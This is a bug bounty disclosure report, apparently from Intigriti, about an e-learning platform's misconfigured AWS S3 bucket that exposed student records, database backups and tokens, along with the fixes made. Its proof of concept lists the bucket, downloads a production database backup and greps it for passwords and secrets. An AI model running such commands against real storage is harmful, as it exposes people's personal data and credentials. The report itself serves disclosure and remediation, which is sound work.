# Title: Information Disclosure via S3 Bucket Misconfiguration

- **Platform**: Intigriti
- **Program**: E-learning Platform
- **Severity**: High
- **Date**: 2024
- **Researcher**: N/A
- **Bounty**: N/A

## Summary
An information disclosure vulnerability was discovered in an e-learning platform where an AWS S3 bucket was misconfigured to allow public listing, exposing student records, course materials, and internal documentation.

## Technical Details
The e-learning platform used AWS S3 to store course materials, user uploads, and backups. The bucket had the `s3:ListBucket` permission granted to `*` (any authenticated AWS user), meaning anyone with an AWS account could list all objects in the bucket.

Additionally, many objects in the bucket were publicly readable (`s3:GetObject` granted to `*`). The exposed data included:
- Student personally identifiable information (names, emails, addresses)
- Course materials and answer keys
- Database backup files containing hashed passwords
- Internal API documentation with authentication tokens
- Server log files

## Steps to Reproduce
1. Install and configure AWS CLI
2. Run `aws s3 ls s3://elearning-platform-assets/` using any AWS credentials
3. The command returns a list of all objects in the bucket
4. Download interesting files using `aws s3 cp s3://elearning-platform-assets/backups/ ./`
5. Extract database backup files and analyze contents

## Proof of Concept
```bash
# List bucket contents
aws s3 ls s3://elearning-platform-assets/

# Download database backup
aws s3 cp s3://elearning-platform-assets/backups/production_db_2024.sql.gz ./

# Extract and search for credentials
gunzip production_db_2024.sql.gz
grep -i "password\|secret\|key" production_db_2024.sql
```

## Impact
- Exposure of 100,000+ student records
- Access to course materials and answer keys
- Database credentials and infrastructure access
- Regulatory compliance violations

## Remediation
The platform:
- Removed public bucket listing permissions
- Implemented IAM-based access control
- Used pre-signed URLs for temporary access
- Rotated all exposed credentials

## References
- https://www.intigriti.com/blog/bug-bounty/s3-bucket-misconfiguration
